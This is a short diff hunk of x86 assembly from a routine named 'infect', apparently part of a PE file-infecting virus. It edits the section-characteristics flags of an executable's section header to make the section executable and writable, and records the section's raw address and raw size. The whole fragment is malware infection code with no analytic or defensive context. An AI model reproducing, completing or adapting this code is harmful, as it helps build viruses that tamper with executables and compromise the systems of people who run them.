@@ -465,8 +465,8 @@ infect:
             add edx, 0E0h
             push edx
             lea eax, [edx+24h]              ; characteristics
-            mov ecx, 0E0000020h
-            mov [eax], ecx
+            mov ecx, 020000020h
+            xor [eax], ecx
             mov ecx, [edx+14h]              ; raw address
             mov [ebp+lastRawaddr], ecx
             mov ecx, [edx+10h]              ; raw size
